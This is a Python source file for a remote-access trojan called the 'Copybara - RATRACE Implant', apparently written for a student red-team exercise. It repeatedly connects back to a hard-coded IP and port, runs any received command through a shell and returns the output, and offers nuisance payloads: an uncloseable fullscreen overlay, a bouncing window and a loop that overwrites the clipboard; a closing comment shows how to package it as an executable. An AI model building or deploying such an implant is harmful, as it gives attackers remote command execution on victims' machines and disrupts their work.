import socket
import subprocess
import sys
import threading
import pyperclip
from pathlib import Path
from typing import Union
import time
import tkinter as tk
from PIL import Image, ImageTk

art = r"""
 ██████╗ ██████╗ ██████╗ ██╗   ██╗██████╗  █████╗ ██████╗  █████╗  
██╔════╝██╔═══██╗██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗
██║     ██║   ██║██████╔╝ ╚████╔╝ ██████╔╝███████║██████╔╝███████║
██║     ██║   ██║██╔═══╝   ╚██╔╝  ██╔══██╗██╔══██║██╔══██╗██╔══██║
╚██████╗╚██████╔╝██║        ██║   ██████╔╝██║  ██║██║  ██║██║  ██║
 ╚═════╝ ╚═════╝ ╚═╝        ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
⠀⠀⢀⣀⠤⠿⢤⢖⡆⢤⢖⡆⢤⢖⡆⢤⢖⡆⢤⢖⡆⢤⢖⡆⢤⢖⡆⢤⢖⡆⢤⢖⡆⢤⢖⡆⢤⢖⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡔⢩⠂⠀⠒⠗⠈⠀⠉⠢⠄⣀⠠⠤⠄⠒⢖⡒⢒⠂⠤⢄⠂⠤⢄⠂⠤⢄⠂⠤⢄⠂⠤⢄⠂⠤⢄⠂⠤⢄⠂⠤⢄⠂⠤⢄⠂⠤⢄⠀⠀⠀⠀
⠇⠤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠈⠀⠀⠈⠀⠈⠈⡨⢀⠡⡪⠢⡀⡪⠢⡀⡪⠢⡀⡪⠢⡀⡪⠢⡀⡪⠢⡀⡪⠢⡀⡪⠢⡀⡪⠢⡀⡪⠢⡀⡪⠢⡀
⠈⠒⠀⠤⠤⣄⡆⡂⠀⠀⠀⠀⠀⠀  ⠀⠀⠀⠀⠀⠀⠀⠢⠀⢕⠱⠀⢕⠱⠀⢕⠱⠀⢕⠱⠀⢕⠱⠀⢕⠱⠀⢕⠱⠀⢕⠱⠀⢕⠱⠀⢕⠱⠀⢕⠱⠀
⠀⣀⡠⠶⡄⠈⢳⣐⡐⠐⡀⠀⠀⠀⠀  ⠀⠀⠀⠀⠀⠀⠀⠈⠀⠁⠇⠀⠁⠇⠀⠁⠇⠀⠁⠇⠀⠁⠇⠀⠁⠇⠀⠁⠇⠀⠁⠇⠀⠁⠇⠀⠁⠇⠀⠁⠇
⣞⢱⣿⣯⠏⣧⣄⠑⢤⢁⠀⠆⠀⠀⠀⠀  ⠀⢀⢰⠀⠀⠀⡀⢄⡜⡀⢄⡜⡀⢄⡜⡀⢄⡜⡀⢄⡜⡀⢄⡜⡀⢄⡜⡀⢄⡜⡀⢄⡜⡀⢄⡜⡀⢄⡜⠀
⠈⣏⠿⣫⠎⠡⡈⠳⡜⡦⠄⡷⠢⠤⠤⠤⠤⢬⢈⡇⢠⣈⣰⠎⣈⣰⠎⣈⣰⠎⣈⣰⠎⣈⣰⠎⣈⣰⠎⣈⣰⠎⣈⣰⠎⣈⣰⠎⣈⣰⠎⣈⣰⣈⣰⠀⠀
⠀⠈⣏⡁⠂⢁⡴⠊⠀⣃⢸⡇⠀⠀⠀⠀⠀⠈⢪⢀⣺⡅⢈⠆⡅⢈⠆⡅⢈⠆⡅⢈⠆⡅⢈⠆⡅⢈⠆⡅⢈⠆⡅⢈⠆⡅⢈⠆⡅⢈⠆⡅⢈⠆⠆⠀⠀
⠀⠀⠀⠈⠳⠃⠀⠶⡿⠤⠚⠁⠀⠀⠀⢀⣠⡤⢺⣥⠟⢡⠃⠟⢡⠃⠟⢡⠃⠟⢡⠃⠟⢡⠃⠟⢡⠃⠟⢡⠃⠟⢡⠃⠟⢡⠃⠟⢡⠃⠟⢡⠃⠟⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠉⠉⠀⠀
Can't Stop Won't Stop | Copybara - RATRACE Implant | mjw6944@rit.edu
"""

def resource_path(relative_path: Union[
    str, Path]) -> Path:
    base_dir = Path(__file__).parent
    if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
        base_dir = Path(sys._MEIPASS)
    return base_dir / relative_path

def connect():
    help_text = """Available commands:
help - Display this help message
gort - Summons Gort
bounce - Makes an un-closeable bouncing rodent 
copybara - Permenantly render the clipboard unusable

INTERACTIVE ONLY COMMANDS:
duration [time] - sets duration
splash - sends splash art"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.197.222", 5555))
    failsafe = 0
    duration = 120
    while failsafe < 20:
        command = s.recv(4096).decode()
        if command == "info":
            s.send("copybarav2 help gort bounce copybara".encode("utf-8"))
        elif command == "help":
            s.send(help_text.encode("utf-8"))   
        elif command == "gort":
            gthread = threading.Thread(target=window, args=(duration,))
            gthread.start()
            s.send("GORT IS HERE".encode("utf-8"))
        elif command == "bounce":
            bthread = threading.Thread(target=bounce, args=(duration,))
            bthread.start()
            s.send("Triggered Bounce".encode("utf-8"))
        elif command == "copybara":
            cthread = threading.Thread(target=clipboard, args=(duration,))
            cthread.start()
            s.send("Coconut Doggo".encode("utf-8"))
        elif command == "splash":
            s.send(art.encode("utf-8"))
        elif "duration" in command:
            try:
                duration = int(command.split(" ")[1])
                s.send(("Set duration to " + str(duration)).encode("utf-8"))
            except Exception as e:
                s.send(("Current duration is " + str(duration)).encode("utf-8"))
        else:
            output = subprocess.getoutput(command)
            s.send(output.encode("utf-8"))
        if command == "":
            failsafe += 1
        else:
            failsafe = 0
    s.close()

def window(duration):
    def onClosing():
        pass
    #pil_img = pil_img.resize((300, 200), Image.LANCZOS)
    box =tk.Tk()
    box.attributes('-topmost', False)
    box.attributes('-fullscreen', True)
    box.attributes('-alpha', 0.6)
    box.protocol("delete", onClosing())
    box.overrideredirect(True)
    img = Image.open(resource_path(Path('copydata') / 'gort.png'))
    img = ImageTk.PhotoImage(img)
    label =tk.Label(box, image=img)
    label.pack(expand=True)
    box.after(duration * 1000, lambda: box.destroy())
    box.mainloop()

def bounce(duration):
    box = tk.Tk()
    box.overrideredirect(True)  # borderless window (optional)
    box.configure(bg="black")
    win_w, win_h = 594, 646
    screen_w = box.winfo_screenwidth()
    screen_h = box.winfo_screenheight()
    state = {"x": 100, "y": 100, "dx": 3, "dy": 3}
    img = Image.open(resource_path(Path('copydata') / 'rodent.png'))
    img = ImageTk.PhotoImage(img)
    box.attributes('-topmost', True)
    label = tk.Label(box, image=img)
    label.pack(expand=True)
    def move():
        # update position
        state["x"] += state["dx"]
        state["y"] += state["dy"]
        # bounce off left/right
        if state["x"] <= 0 or state["x"] + win_w >= screen_w:
            state["dx"] = -state["dx"]
        # bounce off top/bottom
        if state["y"] <= 0 or state["y"] + win_h >= screen_h:
            state["dy"] = -state["dy"]
        # move window
        box.geometry(f"{win_w}x{win_h}+{state['x']}+{state['y']}")
        box.after(20, move)  # schedule next frame
    move()
    box.after(duration*1000, lambda: box.destroy())
    box.mainloop()

def clipboard(duration):
    starttime = time.time()
    while time.time() < starttime + duration:
        pyperclip.copy("Capybara? Capybara! Coconut Doggo!")
        time.sleep(0.1)

if __name__ == "__main__":
    while True:
        try:
            connect()
        except Exception as e:
            time.sleep(5)
#implants>pyinstaller --onefile --add-data "copydata/*.png:copydata/" --icon="copydata/icon.ico" copybarav2.py